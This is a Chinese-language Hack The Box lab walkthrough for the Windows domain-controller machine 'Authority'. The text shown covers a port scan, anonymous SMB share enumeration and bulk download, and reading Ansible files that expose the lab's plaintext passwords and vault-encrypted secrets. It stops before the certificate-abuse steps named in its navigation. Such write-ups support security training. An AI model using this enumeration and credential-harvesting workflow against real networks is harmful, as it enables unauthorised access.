    <nav class="md-nav" aria-label="CA模板漏洞">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#certify" class="md-nav__link">
    <span class="md-ellipsis">
      Certify搜索漏洞模板
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket-addcomputer" class="md-nav__link">
    <span class="md-ellipsis">
      impacket-addcomputer添加机器账户
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-by-certipy" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse by Certipy
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abuse by Certipy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      小插曲：迷之报错
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certipy" class="md-nav__link">
    <span class="md-ellipsis">
      certipy请求证书
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kdc_err_padata_type_nosupp" class="md-nav__link">
    <span class="md-ellipsis">
      KDC_ERR_PADATA_TYPE_NOSUPP
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#passthecert" class="md-nav__link">
    <span class="md-ellipsis">
      PassTheCert
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flag-root" class="md-nav__link">
    <span class="md-ellipsis">
      flag: root
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      总结·后记
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  
  
<nav class="md-tags" >
  
    
    
    
      <span class="md-tag">HTB/Windows</span>
    
  
    
    
    
      <span class="md-tag">HTB/Medium</span>
    
  
</nav>


  
  


  <h1>HTB-Authority</h1>

<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
<p>...</p>
<h3 id="attack-path-overview">Attack Path Overview<a class="headerlink" href="#attack-path-overview" title="Permanent link">&para;</a></h3>
<p><a class="glightbox" href="../../attackpath/HTB-Authority.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="attack-path" src="../../attackpath/HTB-Authority.png" width="450" /></a></p>
<h2 id="_1">扫描<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>自用扫描脚本：<a href="https://github.com/TimeLess613/workflow-scan4HTB/blob/main/workflow-scan4HTB.sh">工作流</a></p>
<p>开放端口：
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT      STATE SERVICE       VERSION
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>53/tcp    open  domain        Simple DNS Plus
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>80/tcp    open  http          Microsoft IIS httpd 10.0
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 09:52:17Z)
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>135/tcp   open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>445/tcp   open  microsoft-ds?
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>464/tcp   open  kpasswd5?
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>8443/tcp  open  ssl/https-alt
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>9389/tcp  open  mc-nmf        .NET Message Framing
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>49664/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>49665/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>49666/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>49667/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>49671/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>49687/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>49689/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>49690/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>49699/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>49703/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>49713/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>52705/tcp open  msrpc         Microsoft Windows RPC
</span></code></pre></div></p>
<h2 id="_2">攻击路径规划·漏洞分析<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Windows靶机，开了53、88等端口所以应该是域控——其实一台Windows靶机的话也只能是域控了吧，不然也没啥打的了。<br />
一共扫出29个开放端口，稍微分一下类然后按照优先度排一下：</p>
<ol>
<li>SMB：139，445</li>
<li>HTTP/S：80，（8443）</li>
<li>LDAP：389，636，（3268，3269）</li>
<li>RPC：135，（593）</li>
<li>域控相关：53，88，（464）</li>
<li>WinRM：5985</li>
<li>有一些不太熟悉：464，593，3268，326，8443，9389<ul>
<li>464：Kerberos进行密码重设的端口</li>
<li>593：原来ncacn_http是RPC的一个协议序列 <a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#identifying-exposed-rpc-services">RPC over HTTP</a></li>
<li>3268，3269：似乎是用于全局目录（Global Catalog）的查询。 <em>全局目录是Active Directory中的一个功能，它包含了所有域的一部分通用属性信息，方便在跨域查询时快速访问这些信息</em></li>
<li>8443：搜索“ssl/https-alt”发现<a href="https://stackoverflow.com/questions/61760786/what-is-the-use-of-port-8443">这个讨论</a>。那么8443应该也算web？ <em>"alt" 是 "alternative"（替代）的简写形式</em></li>
<li>9389：不太懂，姑且搜到<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-nmf/0aab922d-8023-48bb-8ba2-c4d3404cc69d">MS文档</a></li>
</ul>
</li>
<li>高位动态端口：似乎基本都是RPC相关</li>
</ol>
<p>关于立足的预想路径：SMB——&gt;WEB (——&gt;LDAP——&gt;RPC)<br />
SMB探索的东西应该不多，先看看这个收集一些信息。然后可以看看web端是否有突破口。LDAP和RPC经验不足，感觉如果web能突破可能就不需要后面了。web无法突破的话可能有域凭据然后枚举LDAP？获得凭据之后估计可以用 <code>evil-winrm</code> 建立连接。</p>
<h2 id="smb">SMB探索<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h2>
<p>首先枚举SMB共享：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>└─$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.10.11.222/<span class="w"> </span>-N<span class="w">            </span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">        </span>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">        </span>---------<span class="w">       </span>----<span class="w">      </span>-------
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">        </span>Department<span class="w"> </span>Shares<span class="w"> </span>Disk<span class="w">      </span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">        </span>Development<span class="w">     </span>Disk<span class="w">      </span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">        </span>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">        </span>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">        </span>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share
</span></code></pre></div></p>
<p>各个共享都试试无密码进入。发现 <code>Development</code> 这个共享资源里有一些感兴趣的东西，全部拿到本地再慢慢看：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>└─$<span class="w"> </span>smbclient<span class="w"> </span>//10.10.11.222/Development<span class="w"> </span>-N
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mask<span class="w"> </span><span class="s2">&quot;&quot;</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>recurse<span class="w"> </span>ON
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>prompt<span class="w"> </span>OFF
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1">#smb: \&gt; cd &#39;path\to\remote\dir&#39;</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1">#smb: \&gt; lcd &#39;~/path/to/download/to/&#39;</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mget<span class="w"> </span>*
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/Authority/SMB/Automation/Ansible<span class="o">]</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>└─$<span class="w"> </span>ls<span class="w"> </span>*<span class="w">    </span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>ADCS:
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>defaults<span class="w">  </span>meta<span class="w">      </span>README.md<span class="w">         </span>requirements.yml<span class="w">  </span>tasks<span class="w">      </span>tox.ini
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>LICENSE<span class="w">   </span>molecule<span class="w">  </span>requirements.txt<span class="w">  </span>SECURITY.md<span class="w">       </span>templates<span class="w">  </span>vars
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>LDAP:
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>defaults<span class="w">  </span>files<span class="w">  </span>handlers<span class="w">  </span>meta<span class="w">  </span>README.md<span class="w">  </span>tasks<span class="w">  </span>templates<span class="w">  </span>TODO.md<span class="w">  </span>Vagrantfile<span class="w">  </span>vars
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>PWM:
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>ansible.cfg<span class="w">  </span>ansible_inventory<span class="w">  </span>defaults<span class="w">  </span>handlers<span class="w">  </span>meta<span class="w">  </span>README.md<span class="w">  </span>tasks<span class="w">  </span>templates
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>SHARE:
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>tasks
</span></code></pre></div></p>
<h2 id="development">Development共享的文件分析<a class="headerlink" href="#development" title="Permanent link">&para;</a></h2>
<p>里面是ansible的几个项目？正好自己有了解一点ansible。<br />
文件似乎有点多，我一般都习惯从少的开始看，可以先看完一个没啥用的话就丢弃，然后专注剩下的文件多的东西。</p>
<h3 id="share">SHARE<a class="headerlink" href="#share" title="Permanent link">&para;</a></h3>
<p>没啥有用的信息。</p>
<h3 id="pwm">PWM<a class="headerlink" href="#pwm" title="Permanent link">&para;</a></h3>
<ul>
<li>README里面提到 <code>defaults/main.yml</code> 的几个变量，看变量名十分敏感。然后搜了一下PWM，似乎是一个密码管理工具。<ul>
<li><a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a></li>
<li><a href="https://opensource.com/article/19/4/automate-password-resets-pwm">https://opensource.com/article/19/4/automate-password-resets-pwm</a></li>
</ul>
</li>
<li>cfg文件里发现一个用户：<code>svc_pwm</code>。</li>
<li>inventory文件里配置了清单变量。有ansible凭据（<code>administrator:Welcome1</code>），似乎可以通过端口5985的winrm连接目标。</li>
<li><code>defaults/main.yml</code> 里面有3组用ansible vault加密的字符串变量（<code>pwm_admin_login</code>，<code>pwm_admin_password</code>，<code>ldap_admin_password</code>）。</li>
<li>tasks的playbook像是在部署PWM这个应用，内容就是README提到的步骤。里面用到了template来配置Tomcat的config。</li>
<li>Tomcat的config里有两组凭据，用途不明。<ul>
<li><code>admin:T0mc@tAdm1n</code></li>
<li><code>robot:T0mc@tR00t</code></li>
</ul>
</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>└─$<span class="w"> </span>cat<span class="w"> </span>ansible.cfg<span class="w">              </span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="o">[</span>defaults<span class="o">]</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nv">hostfile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ansible_inventory
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nv">remote_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>svc_pwm
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>（略）
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>└─$<span class="w"> </span>cat<span class="w"> </span>ansible_inventory
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>ansible_user:<span class="w"> </span>administrator
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>ansible_password:<span class="w"> </span>Welcome1
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>ansible_port:<span class="w"> </span><span class="m">5985</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>ansible_connection:<span class="w"> </span>winrm
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>ansible_winrm_transport:<span class="w"> </span>ntlm
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>ansible_winrm_server_cert_validation:<span class="w"> </span>ignore
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>└─$<span class="w"> </span>cat<span class="w"> </span>defaults/main.yml<span class="w">      </span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>---
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>pwm_run_dir:<span class="w"> </span><span class="s2">&quot;{{ lookup(&#39;env&#39;, &#39;PWD&#39;) }}&quot;</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>pwm_hostname:<span class="w"> </span>authority.htb.corp
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>pwm_http_port:<span class="w"> </span><span class="s2">&quot;{{ http_port }}&quot;</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>pwm_https_port:<span class="w"> </span><span class="s2">&quot;{{ https_port }}&quot;</span>
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>pwm_https_enable:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>pwm_require_ssl:<span class="w"> </span><span class="nb">false</span>
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>
</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>pwm_admin_login:<span class="w"> </span>!vault<span class="w"> </span><span class="p">|</span>
</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="w">          </span><span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span><span class="m">1</span>.1<span class="p">;</span>AES256
</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="w">          </span><span class="m">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="w">          </span>6134353663663462373265633832356663356239383039640a346431373431666433343434366139
</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="w">          </span><span class="m">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="w">          </span>6334326263326364380a653034313733326639323433626130343834663538326439636232306531
</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a><span class="w">          </span><span class="m">3438</span>
</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a>
</span><span id="__span-3-40"><a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a>pwm_admin_password:<span class="w"> </span>!vault<span class="w"> </span><span class="p">|</span>
</span><span id="__span-3-41"><a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a><span class="w">          </span><span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span><span class="m">1</span>.1<span class="p">;</span>AES256
</span><span id="__span-3-42"><a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a><span class="w">          </span><span class="m">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
</span><span id="__span-3-43"><a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a><span class="w">          </span>3335616263326464633832376261306131303337653964350a363663623132353136346631396662
</span><span id="__span-3-44"><a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a><span class="w">          </span><span class="m">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
</span><span id="__span-3-45"><a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a><span class="w">          </span>3930356637306461350a316466663037303037653761323565343338653934646533663365363035
</span><span id="__span-3-46"><a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a><span class="w">          </span><span class="m">6531</span>
</span><span id="__span-3-47"><a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a>
</span><span id="__span-3-48"><a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a>ldap_uri:<span class="w"> </span>ldap://127.0.0.1/
</span><span id="__span-3-49"><a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a>ldap_base_dn:<span class="w"> </span><span class="s2">&quot;DC=authority,DC=htb&quot;</span>
</span><span id="__span-3-50"><a id="__codelineno-3-50" name="__codelineno-3-50" href="#__codelineno-3-50"></a>ldap_admin_password:<span class="w"> </span>!vault<span class="w"> </span><span class="p">|</span>
</span><span id="__span-3-51"><a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a><span class="w">          </span><span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span><span class="m">1</span>.1<span class="p">;</span>AES256
</span><span id="__span-3-52"><a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a><span class="w">          </span><span class="m">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
</span><span id="__span-3-53"><a id="__codelineno-3-53" name="__codelineno-3-53" href="#__codelineno-3-53"></a><span class="w">          </span>3437333035366235613437373733316635313530326639330a643034623530623439616136363563
</span><span id="__span-3-54"><a id="__codelineno-3-54" name="__codelineno-3-54" href="#__codelineno-3-54"></a><span class="w">          </span><span class="m">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
</span><span id="__span-3-55"><a id="__codelineno-3-55" name="__codelineno-3-55" href="#__codelineno-3-55"></a><span class="w">          </span>3238343230333633350a646664396565633037333431626163306531336336326665316430613566
</span><span id="__span-3-56"><a id="__codelineno-3-56" name="__codelineno-3-56" href="#__codelineno-3-56"></a><span class="w">          </span><span class="m">3764</span>
</span><span id="__span-3-57"><a id="__codelineno-3-57" name="__codelineno-3-57" href="#__codelineno-3-57"></a>
</span><span id="__span-3-58"><a id="__codelineno-3-58" name="__codelineno-3-58" href="#__codelineno-3-58"></a>
</span><span id="__span-3-59"><a id="__codelineno-3-59" name="__codelineno-3-59" href="#__codelineno-3-59"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-3-60"><a id="__codelineno-3-60" name="__codelineno-3-60" href="#__codelineno-3-60"></a>└─$<span class="w"> </span>cat<span class="w"> </span>tasks/main.yml
</span><span id="__span-3-61"><a id="__codelineno-3-61" name="__codelineno-3-61" href="#__codelineno-3-61"></a>（略）
</span><span id="__span-3-62"><a id="__codelineno-3-62" name="__codelineno-3-62" href="#__codelineno-3-62"></a>-<span class="w"> </span>name:<span class="w"> </span>Configure<span class="w"> </span>Tomcat<span class="w"> </span>
</span><span id="__span-3-63"><a id="__codelineno-3-63" name="__codelineno-3-63" href="#__codelineno-3-63"></a><span class="w">  </span>template:
</span><span id="__span-3-64"><a id="__codelineno-3-64" name="__codelineno-3-64" href="#__codelineno-3-64"></a><span class="w">    </span>src:<span class="w"> </span>templates/tomcat-users.xml.j2
</span><span id="__span-3-65"><a id="__codelineno-3-65" name="__codelineno-3-65" href="#__codelineno-3-65"></a><span class="w">    </span>dest:<span class="w"> </span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\A</span>pache<span class="w"> </span>Software<span class="w"> </span>Foundation<span class="se">\T</span>omcat<span class="w"> </span><span class="m">10</span>.0<span class="se">\c</span>onf<span class="se">\t</span>omcat-users.xml
</span><span id="__span-3-66"><a id="__codelineno-3-66" name="__codelineno-3-66" href="#__codelineno-3-66"></a>（略）
